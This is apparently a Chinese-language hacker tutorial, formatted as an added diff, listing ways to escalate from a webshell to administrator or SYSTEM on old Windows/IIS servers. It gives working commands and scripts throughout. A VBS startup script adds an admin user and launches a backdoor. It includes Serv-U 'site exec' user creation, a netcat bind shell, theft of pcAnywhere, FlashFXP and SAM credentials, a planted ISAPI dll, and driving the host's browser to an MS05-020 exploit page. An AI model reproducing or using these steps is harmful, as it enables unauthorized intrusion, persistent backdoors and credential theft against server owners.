@@ -1,0 +1,220 @@
+　　众多黑客费力搞到一个webshell后,当然还想继续获得整个服务器的admin权限，正如不想得到admin的不是好黑客～ 嘻嘻～～好跟我来，看看有什么可以利用的来提升权限.
+
+　　第一
+
+　　如果服务器上有装了pcanywhere服务端，管理员为了管理方便也给了我们方便，到系统盘的Documents and Settings/All Users/Application Data/Symantec/pcAnywhere/中下载*.cif本地破解就使用pcanywhere连接就ok了
+
+　　第二
+
+　　有很多小黑问我这么把webshell的iis user权限提升一般服务器的管理都是本机设计完毕然后上传到空间里，那么就会用到ftp，服务器使用最多的就是servu那么我们就利用servu来提升权限通过servu提升权限需要servu安装目录可写～
+
+　　好开始把，首先通过webshell访问servu安装文件夹下的ServUDaemon.ini把他下载下来，然后在本机上安装一个 servu把 ServUDaemon.ini放到本地安装文件夹下覆盖，启动servu添加了一个用户，设置为系统管理员，目录C:，具有可执行权限然后去 servu安装目录里把ServUDaemon.ini更换服务器上的。
+
+　　用我新建的用户和密码连接～好的，还是连上了
+
+ftp
+ftp>open ip
+Connected to ip.
+220 Serv-U FTP Server v5.0.0.4 for WinSock ready...
+User (ip:(none)): id //刚才添加的用户
+331 User name okay, please send complete E-mail address as password.
+Password:password //密码
+230 User logged in, proceed.
+ftp> cd winnt //进入win2k的winnt目录
+250 Directory changed to /WINNT
+ftp>cd system32 //进入system32目录
+250 Directory changed to /WINNT/system32
+ftp>quote site exec net.exe user rover rover1234 /add //利用系统的net.exe
+文件加用户。
+
+如果提示没有权限，那我们就把后门（server.exe） 传他system32目录然后写一个VBs教本
+set wshshell=createobject ("wscript.shell")
+a=wshshell.run ("cmd.exe /c net user user pass /add",0)
+b=wshshell.run ("cmd.exe /c net localgroup Administrators user /add",0)
+b=wshshell.run ("cmd.exe /c server.exe",0)
+
+　　存为xx.vbe这个教本的作用是建立user用户密码为pass并且提升为管理员然后执行system32目录下的server.exe
+
+　　把这个教本传他 C:Documents and SettingsAll Users「开始」菜单程序启动目录这样管理员只要一登陆就会执行那个教本. 接下来就是等了.等他登陆.
+
+　　第三
+
+　　就是先检查有什么系统服务，或者随系统启动自动启动的程序和管理员经常使用的软件，比如诺顿，VAdministrator，金山，瑞星,WinRAR甚至QQ之类的，是否可以写，如果可以就修改其程序，绑定一个批处理或者VBS，然后还是等待服务器重启。
+
+　　第四
+
+　　查找conn和config ,pass这类型的文件看能否得到sa或者mysql的相关密码，可能会有所收获等等。
+
+　　第五
+
+　　使用Flashfxp也能提升权限，但是成功率就看你自己的运气了首先找到FlashFXP文件夹，打开(编辑)Sites. dat，这个文件这是什么东西密码和用户名，而且密码是加了密的。如果我把这些文件copy回本地也就是我的计算机中，替换我本地的相应文件。然后会发现打开flashfxp在站点中打开站点管理器一样。又可以添加N多肉鸡啦～～嘻嘻～
+
+　　唔??不对啊，是来提升权限的啊，晕，接着来别半途而废。
+
+　　大家看看对方管理员的这站点管理器，有用户名和密码，密码是星号的。经过用xp星号密码查看器查看，然后和Sites.dat中加密了密码做比较发现并未加密而是查到的密码是明文显示，然后最终把这个网站管理员的密码从这堆东西中找出来。那么下一步就可以链接这些新的服务器啦～～
+
+　　经过测试只要把含有密码和用户名的Sites.dat文件替换到本地相应的文件就可以在本地
+
+　　还原对方管理员的各个站点的密码。
+
+　　第六
+
+　　WIN2K+IIS5.0默认情况下应用程序保护选项是"中(共用的)"，这时IIS加载isapi是用的iwam_computername 用户身份执行。但默认情况下WIN2K+IIS5对于一些特殊isapi又要以system身份加载。win2k+iis5 、 win2k+iis5+sp1、win2k+iis5+sp2都是简单的判断isapi的文件名，并且没有做目录限制，以SYSTEM权限加载的 isapi有：
+
+　　1、 idq.dll
+
+　　2、 httpext.dll
+
+　　3、 httpodbc.dll
+
+　　4、 ssinc.dll
+
+　　5、 msw3prt.dll
+
+　　6、 author.dll
+
+　　7、 admin.dll
+
+　　8、 shtml.dll
+
+　　9、 sspifilt.dll
+
+　　10、compfilt.dll
+
+　　11、pwsdata.dll
+
+　　12、md5filt.dll
+
+　　13、fpexedll.dll
+
+　　所以利用这很容易得到SYSTEM权限。并且判断文件名的时候有个bug，比如请求/scripts/test%81%5cssinc.dll 也将会认为是请求的ssinc.dll,就是分离文件路径的时候没有考虑到双字节的 远东版问题。ssinc.dll在处理包含文件路径的时候也有一个问题，就是 "/"、""只识别了一个 "/"，所以如果请求里面使用""，就会错误的处理包含文件路径，有可能泄露东西或者出现权限漏洞，这种漏洞很多别的地方( php、asp等)也还存在。
+
+　　加载这些isapi不是单以文件名做依据了，而是加了路径，应该是修正了此问题。
+
+　　一般默认情况下是：
+
+　　1、 idq.dll d:winntsystem32idq.dll
+
+　　2、 httpext.dll d:winntsystem32inetsrvhttpext.dll
+
+　　3、 httpodbc.dll d:winntsystem32inetsrvhttpodbc.dll
+
+　　4、 ssinc.dll d:winntsystem32inrtsrvssinc.dll
+
+　　5、 msw3prt.dll d:winntsystem32msw3prt.dll
+
+　　6、 author.dll D:Program FilesCommon FilesMicrosoft Sharedweb server extensions40isapi_vti_autauthor.dll
+
+　　7、 admin.dll D:Program FilesCommon FilesMicrosoft Sharedweb server extensions40isapi_vti_admadmin.dll
+
+　　8、 shtml.dll D:Program FilesCommon FilesMicrosoft Sharedweb server extensions40isapishtml.dll
+
+　　9、 sspifilt.dll d:winntsystem32inetsrvsspifilt.dll
+
+　　10、compfilt.dll d:winntsystem32inetsrvcompfilt.dll
+
+　　11、pwsdata.dll d:winntsystem32inetsrvpwsdata.dll
+
+　　12、md5filt.dll d:winntsystem32inetsrvmd5filt.dll
+
+　　13、fpexedll.dll D:Program FilesCommon FilesMicrosoft Sharedweb server extensions40binfpexedll.dll
+
+　　正常情况下这些路径都guest不能写,但如果配置不好，这些路径iis user能够写了就一样可以提升权限了
+
+　　可以把ISAPIHack.dll上传到IIS的可执行目录，文件名可叫ssinc.dll或者admin.dll等(上面列的13个文件名之一)。
+
+　　然后等待IIS重启加载此dll，就可以获得权限了
+
+　　第七
+
+　　下载系统的 %windir%repairsam.*(WinNT 4下是sam._ 而Windows 2000下是sam)文件，然后用L0pht等软件进行破解，只要能拿到，肯花时间，就一定可以破解。
+
+　　第八
+
+　　PipeUpAdmin(Windows 2000下), 在本机运行可以把当前用户帐号加入管理员组。普通用户和Guests组用户都可以成功运行。
+
+　　第九
+
+　　Serv-u Ftp Server 本地权限提升漏洞：
+
+　　很多主机的C:Documents and SettingsAll Users Documents目录以及下边几个子目录Documents没有设置权限，导致可以在这个目录上传并运行Exp. 直接上传了serv-u local exploit 和nc, 并且把serv-u的本地提升权限的名字命名为su.exe 文件就放在C:Documents and SettingsAll Users Documents, 然后我们用 su.exe直接建立用户,也可以反弹一个shell过来的。
+
+　　具体命令：
+
+　　建立用户: serv-u.exe "cmd"
+
+　　>USER xl
+
+　　>PASS 111111
+
+　　反弹shell: serv-u.exe "nc.exe -l -p 99 -e cmd.exe"
+
+　　很不错的提权新方法
+
+　　今天我要带给大家的是，当我们得到WEBSHELL后如何得到SYSTEM权限的新方法， 提升权限这个已经是老生常谈了，网络上已经有很多种提升权限的方法了，在这里我就不在提了，今天我给大家介绍的是就是主动利用MS05020漏洞来达到我们提升权限的目的。
+
+　　MS05020是一个IE漏洞，2005.4份的时候微软就发步了这个公告：
+
+　　安全漏洞CN-VA05-025
+
+　　发布日期：2005-04-13
+
+　　漏洞类型：远程执行代码
+
+　　漏洞评估：高危
+
+　　受影响版本：
+
+　　Microsoft Windows 2000 Service Pack 3 和 Microsoft Windows 2000 Service Pack 4
+
+　　Microsoft Windows XP Service Pack 1 和 Microsoft Windows XP Service Pack 2
+
+　　Microsoft Windows XP 64-Bit Edition Service Pack 1 (Itanium)
+
+　　Microsoft Windows XP 64-Bit Edition Version 2003 (Itanium)
+
+　　Microsoft Windows Server 2003
+
+　　Microsoft Windows Server 2003 (用于基于 Itanium 的系统)Microsoft Windows 98、 Microsoft Windows 98 Second Edition (SE) 和 Microsoft Windows Millennium Edition (ME) 测试过的 Microsoft Windows 组件：
+
+　　漏洞描述：
+
+　　Internet Explorer 由于其处理某些 DHTML 对象的方式而存在一个远程执行代码漏洞。攻击者可以通过构建恶意的网页来利用该漏洞。 如果某个用户访问了恶意网站，此恶意网页就可能允许远程执行代码。成功利用此漏洞的攻击者可以完全控制受影响的系统。Internet Explorer 由于其处理某些 URL 的方式而存在一个远程执行代码
+
+　　漏洞。攻击者可以通过构建恶意的网页来利用该漏洞。 如果某个用户访问了恶意网站，此恶意网页就可能允许远程执行代码。成功利用此漏洞的攻击者可以完全控制受影响的系统。Internet Explorer 由于其处理分级审查文件的方法而存在一个远程执行代码漏洞。攻击者可以通过构造特制的分级审查文件来利用此漏洞。如果用户访问了恶意网站或查看了恶意的电子邮件，并接受安装此恶意分级审查文件，则该文件可能允许远程执行代码。成功利用此漏洞的攻击者可以完全控制受影响的系统。 不过，要利用此漏洞，需要进行大量用户交互。
+
+　　大家看到上面的漏洞描述了吗?当被人浏览的时候才会受到攻击，平时我们利用IE漏洞都是先把有攻击性的页面放到网上，然后等待别人去浏览，这样浏览者就会中招了。
+
+　　今天我们要提升权限，那自然是让我们要提升权限的主机去浏览存在漏洞的页面了，那当我们得到WEBSHELL后怎么才能让主机去浏览这个页面呢?
+
+　　Ms05020的EXP网页代码已经出来了，大家可以到：
+
+　　http://www.eviloctal.com/forum/read.php?tid=10127
+
+　　去下载，假如我们已经把这个EXP放到http://www.xxxx.com/ms05020.html的地方，
+
+　　下面我们开始利用这个EXP，进入到我们的ASP木马，打开CMDSHELL，如果用不了的，大家自己想办法解决(可以自己上传一个CMD.EXE上去)。
+
+　　在命令行里输入：start http://www.xxxx.com/ms05020.html 然后点执行。
+
+　　这个时候主机的IE就会去访问我们的这个MS05020.HTML，那么如果主机没有打扑钉的话，就会绑定一个28876的断口在主机上。
+
+　　接着我们输入：netstat -an | find "28876" 看看是否成功绑定，第一次的话，会慢一些，大家要等待一下，我这里很快就成功了。然后我们telnet上去马上就成功了
+
+　　大家看到了：(我添加了一个temp的管理员)
+
+　　现在我们已经拿到SYSTEM权限了 ，大家还想干什么不可以?
+
+　　后记：其实大家还可以先上传NC，然后连接到本地后，再输入：
+
+　　start http://www.xxx.com/ms05020.html也是可以的。
+
+　　还有就是如果可以的话还可以这样输入：
+
+　　start "C:Program FilesInternet Explorericxplore.exe" http://www.xxx.com/ms05020.htm
+
+　　这个要看你的情况了，一般虚拟主机如果允许访问的话，那还是用第一个命令好了!
+
+　　我测试过在2K pro、 2K server(2000 Enterprise Terminal Server) 、2003都成功过!不过也有不成功的时候，而且不成功的概率很大，特别是到虚拟机的时候，有一次我没有成功，然后我开了3389进入，发现IE没有弹出来，而是出来了一个IE设置向导，也就是说这个服务器没有对IE进行网络设置IE是无法访问网络的，艾，其实我现在也没有搞清楚是怎么会事有点能成功有点不行，想也想不通，因为 start ist:http://www.xxx.com/xxx.exe总是能成功!
+
+　　把XXX。EXE下载到它的电脑上面!我最后认为估计这个还是和MS05020.HTM这个文件有关。艾，看来这个方法的利用价值也很小了，本来不想发出来了的，既然写出来了，还是发表出来一下吧!刚刚和无敌讨论了一下，他也是说不成功的原因估计也是这个，还有就是系统打了IE补丁。
